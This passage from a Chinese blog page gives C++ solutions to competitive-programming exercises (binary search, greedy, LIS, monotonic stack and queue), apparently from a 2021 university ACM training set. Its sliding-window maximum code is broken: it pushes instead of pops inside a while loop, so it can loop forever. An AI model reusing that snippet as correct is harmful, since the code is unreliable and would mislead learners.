class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">double</span> a[N],b[N],s[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">double</span> x)</span></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i)&#123; <br>        b[i] = a[i] - x;<br>    &#125;  <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i)&#123; <br>        s[i] = s[i - <span class="hljs-number">1</span>] + b[i];<br>    &#125;<br>    <span class="hljs-type">double</span> ans = <span class="hljs-number">-1e10</span>;<br>    <span class="hljs-type">double</span> minn = <span class="hljs-number">1e10</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = m; i &lt;= n; i++)&#123; <br>        minn = <span class="hljs-built_in">min</span>(minn,s[i - m]);<br>        ans = <span class="hljs-built_in">max</span>(ans,s[i] - minn);<span class="hljs-comment">//子段和</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ans &gt;= <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123; <br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    cin &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i)&#123; <br>        cin &gt;&gt; a[i];<br>    &#125;<br>    <span class="hljs-type">double</span> l = <span class="hljs-number">1</span>,r = <span class="hljs-number">1e9</span>,mid;<br>    <span class="hljs-keyword">while</span>(r - l &gt; <span class="hljs-number">1e-6</span>)&#123; <br>        mid = (l + r) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid))&#123; <br>            l = mid;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123; <br>            r = mid;<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-built_in">int</span>(r * <span class="hljs-number">1000</span>) &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="跳石头：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net"><a href="#跳石头：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net" class="headerlink" title="跳石头：2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)"></a>跳石头：<a href="https://vjudge.net/contest/450579#problem/D">2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> l,n,m,ans;<br><span class="hljs-type">int</span> w[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123; <br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>,cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n + <span class="hljs-number">1</span>; i++)&#123; <br>        <span class="hljs-keyword">if</span>(w[i] - w[j] &lt; x) <br>            cnt++;<br>        <span class="hljs-keyword">else</span> <br>            j = i;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(cnt &gt; m)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123; <br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-number">0</span>);<br>    cin &gt;&gt; l &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123; <br>        cin &gt;&gt; w[i];<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(w + <span class="hljs-number">1</span>, w + <span class="hljs-number">1</span> + n);<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> right = l + <span class="hljs-number">1</span>;<br>    w[n + <span class="hljs-number">1</span>] = l;<br>    <span class="hljs-keyword">while</span>(left  &lt;= right)&#123; <br>        <span class="hljs-type">int</span> mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid))&#123;<br>            ans = mid;<span class="hljs-comment">//ans是一个可行解</span><br>            left = mid + <span class="hljs-number">1</span>;<span class="hljs-comment">//我们尝试看看有没有更好的解</span><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            right = mid - <span class="hljs-number">1</span>;<span class="hljs-comment">//找到了一个非法解，赶紧到左半边找找有没有可行解</span><br>        &#125;<br>    &#125;<br>    cout &lt;&lt; ans;<span class="hljs-comment">//最后的ans绝对是最优解</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="最长上升子序列：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net"><a href="#最长上升子序列：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net" class="headerlink" title="最长上升子序列：2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)"></a>最长上升子序列：<a href="https://vjudge.net/contest/450579#problem/B">2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> inf = <span class="hljs-number">0x3f3f3f</span>;<br><span class="hljs-type">int</span> t,n;<br><span class="hljs-type">int</span> a[<span class="hljs-number">40000</span>], dp[<span class="hljs-number">40000</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123; <br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cin &gt;&gt; t;<br>    <span class="hljs-keyword">while</span>(t--)&#123;<br>        cin &gt;&gt; n;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;<br>            cin &gt;&gt; a[i];<br>            dp[i] = inf;<span class="hljs-comment">//初始化为最大值</span><br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;<br>            *<span class="hljs-built_in">lower_bound</span>(dp + <span class="hljs-number">1</span>, dp + n + <span class="hljs-number">1</span>, a[i]) = a[i];<span class="hljs-comment">//</span><br>        &#125;<br>        cout &lt;&lt; <span class="hljs-built_in">lower_bound</span>(dp + <span class="hljs-number">1</span>, dp + n + <span class="hljs-number">1</span>, inf) - dp - <span class="hljs-number">1</span> &lt;&lt; endl; <span class="hljs-comment">//最后一个不为inf的数的下标即为答案</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="带宝贝：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net"><a href="#带宝贝：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net" class="headerlink" title="带宝贝：2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)"></a>带宝贝：<a href="https://vjudge.net/contest/450579#problem/E">2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Save</span><br>&#123;<br><span class="hljs-type">int</span> p;<span class="hljs-comment">//price</span><br><span class="hljs-type">int</span> m;<span class="hljs-comment">//volume</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> v, n;<br>Save s[<span class="hljs-number">105</span>];<br><span class="hljs-keyword">while</span>(cin &gt;&gt; v  &amp;&amp; v != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(s));<br>cin &gt;&gt; n;<br><span class="hljs-type">int</span> money = <span class="hljs-number">0</span> , sv = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; s[i].p &gt;&gt; s[i].m ;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n<span class="hljs-number">-1</span>; i++)<span class="hljs-comment">//sort the s by price</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++)<br><span class="hljs-keyword">if</span>(s[i].p &lt; s[j].p)<br><span class="hljs-built_in">swap</span>(s[i], s[j]);<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; n; i++)<span class="hljs-comment">//Get the i-th whole things. </span><br>&#123;<br>sv += s[i].m;<br><span class="hljs-keyword">if</span>(sv &gt; v)<span class="hljs-comment">//如果累加的体积大于袋子的体积了，则跳出循环</span><br><span class="hljs-keyword">break</span>;<br>money += s[i].p * s[i].m;<br>&#125;<br>money = money + (v - (sv - s[i].m) ) * s[i].p; <br>cout &lt;&lt; money &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="我就是夹心糖捏：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net"><a href="#我就是夹心糖捏：2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net" class="headerlink" title="我就是夹心糖捏：2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)"></a>我就是夹心糖捏：<a href="https://vjudge.net/contest/450579#problem/H">2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1005</span>;<br><span class="hljs-type">int</span> a[maxn],b[maxn];<br><span class="hljs-type">double</span> c[maxn];<br><span class="hljs-type">int</span> n,k;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">ok</span><span class="hljs-params">(<span class="hljs-type">double</span> ans)</span></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;i++)&#123;<br>c[i] = a[i] - (ans / <span class="hljs-number">100</span> * b[i]) ;  <span class="hljs-comment">//第i个的平均值 a[i]/b[i] = ans</span><br>&#125;<br><span class="hljs-built_in">sort</span>(c,c+n);<br><span class="hljs-type">double</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n - k;i++)&#123;    <span class="hljs-comment">// n - k 抛弃 K 个数 </span><br>sum += c[n<span class="hljs-number">-1</span>-i];     <span class="hljs-comment">//  从后往前，后面的值大， </span><br>&#125;<br><span class="hljs-keyword">return</span> sum &gt;= <span class="hljs-number">0</span>;   <span class="hljs-comment">//ans这个平均值应该满足的条件</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;k) != EOF)&#123;<br><span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span> &amp;&amp; k == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;b[i]);<br>&#125;<br><span class="hljs-type">double</span> l = <span class="hljs-number">0</span>,r = <span class="hljs-number">105</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">100</span>;i++)&#123;<br><span class="hljs-type">double</span> mid = (l + r) / <span class="hljs-number">2</span>;    <span class="hljs-comment">//二分法求平均值 </span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">ok</span>(mid))&#123;<br>l = mid;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>r = mid;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.0f\n&quot;</span>,r);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="单调栈：Problem-1506-hdu-edu-cn"><a href="#单调栈：Problem-1506-hdu-edu-cn" class="headerlink" title="单调栈：Problem - 1506 (hdu.edu.cn)"></a>单调栈：<a href="https://acm.hdu.edu.cn/showproblem.php?pid=1506">Problem - 1506 (hdu.edu.cn)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span> + <span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> sta[N], top;<br><span class="hljs-type">int</span> a[N], r[N], l[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-number">0</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (cin &gt;&gt; n &amp;&amp; n)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            cin &gt;&gt; a[i]; <span class="hljs-comment">//每个矩形的高度</span><br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            l[i] = r[i] = i;<br>        &#125;<br>        top = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            <span class="hljs-keyword">while</span> (top &amp;&amp; a[sta[top]] &gt;= a[i])<br>            &#123;<br>                top--;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!top)<br>                l[i] = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span><br>                l[i] = sta[top] + <span class="hljs-number">1</span>;<br>            sta[++top] = i;<br>        &#125;<br>        top = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n; i &gt;= <span class="hljs-number">1</span>; i--)<br>        &#123;<br>            <span class="hljs-keyword">while</span> (top &amp;&amp; a[sta[top]] &gt;= a[i])<br>            &#123;<br>                top--;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!top)<br>                r[i] = n;<br>            <span class="hljs-keyword">else</span><br>                r[i] = sta[top] - <span class="hljs-number">1</span>;<br>            sta[++top] = i;<br>        &#125;<br>        ll ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>            ans = <span class="hljs-built_in">max</span>(ans, <span class="hljs-number">1LL</span> * a[i] * (r[i] - l[i] + <span class="hljs-number">1</span>));<br>        cout &lt;&lt; ans &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="单调队列：https-www-luogu-com-cn-problem-P1886"><a href="#单调队列：https-www-luogu-com-cn-problem-P1886" class="headerlink" title="单调队列：https://www.luogu.com.cn/problem/P1886"></a>单调队列：<a href="https://www.luogu.com.cn/problem/P1886">https://www.luogu.com.cn/problem/P1886</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e6</span> + <span class="hljs-number">5</span>;<br><br><span class="hljs-type">int</span> a[maxn];<br>deque&lt;<span class="hljs-type">int</span>&gt; Q;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n, k;<br>    cin &gt;&gt; n &gt;&gt; k;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        cin &gt;&gt; a[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-keyword">while</span> (!Q.<span class="hljs-built_in">empty</span>() &amp;&amp; a[Q.<span class="hljs-built_in">back</span>()] &gt;= a[i])<br>            Q.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">//不优,弹出</span><br>        Q.<span class="hljs-built_in">push_back</span>(i);<br>        <span class="hljs-keyword">while</span> (Q.<span class="hljs-built_in">front</span>() &lt; i - k + <span class="hljs-number">1</span>)<br>            Q.<span class="hljs-built_in">pop_front</span>();<br>        <span class="hljs-keyword">if</span> (i &gt;= k)<br>            cout &lt;&lt; a[Q.<span class="hljs-built_in">front</span>()] &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br><br>    <span class="hljs-keyword">while</span> (!Q.<span class="hljs-built_in">empty</span>())<br>        Q.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-keyword">while</span> (!Q.<span class="hljs-built_in">empty</span>() &amp;&amp; a[Q.<span class="hljs-built_in">back</span>()] &lt;= a[i])<br>            Q.<span class="hljs-built_in">push_back</span>(i);<br>        <span class="hljs-keyword">while</span> (Q.<span class="hljs-built_in">front</span>() &lt; i - k + <span class="hljs-number">1</span>)<br>            Q.<span class="hljs-built_in">pop_front</span>();<br>        <span class="hljs-keyword">if</span> (i &gt;= k)<br>            cout &lt;&lt; a[Q.<span class="hljs-built_in">front</span>()] &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-number">0</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ST表-https-www-luogu-com-cn-problem-P3865"><a href="#ST表-https-www-luogu-com-cn-problem-P3865" class="headerlink" title="ST表:https://www.luogu.com.cn/problem/P3865"></a>ST表:<a href="https://www.luogu.com.cn/problem/P3865">https://www.luogu.com.cn/problem/P3865</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 